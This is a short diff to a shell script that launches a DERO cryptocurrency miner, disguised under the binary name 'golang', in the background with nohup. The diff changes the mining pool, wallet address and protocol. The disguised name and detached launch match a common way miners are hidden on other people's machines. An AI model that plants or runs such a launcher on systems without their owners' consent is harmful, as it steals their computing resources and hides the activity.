@@ -1,2 +1,2 @@
 chmod 700 golang
-nohup ./golang -r dero-node-va.mysrv.cloud:10300 -w deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnje7yu7pv0rlr -p rpc &
+nohup ./golang -r asia.whalesburg.com:4300 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.ZORG -p stratum &
